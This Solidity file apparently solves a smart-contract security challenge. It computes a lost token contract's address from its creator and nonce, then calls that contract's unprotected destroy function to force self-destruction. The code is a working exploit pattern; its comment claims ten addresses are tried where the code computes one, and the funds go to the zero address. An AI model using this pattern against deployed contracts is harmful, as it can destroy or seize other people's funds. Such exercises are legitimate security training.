// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISimpleToken {
    // collect ether in return for tokens
    receive() payable external;

    // allow transfers of tokens
    function transfer(address _to, uint _amount) external;

    // clean up after ourselves
    function destroy(address payable _to) external;
}


contract RecoveryAttack {

    function attack(address _recovery, uint8 nonce) public {
        // Test 10 possible contract addresses that could have been created by the recovery contract (assuming using only CREATE opcode).
        address token = address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), _recovery, nonce)))));
        ISimpleToken(payable(token)).destroy(payable(address(0x0)));
    }
}
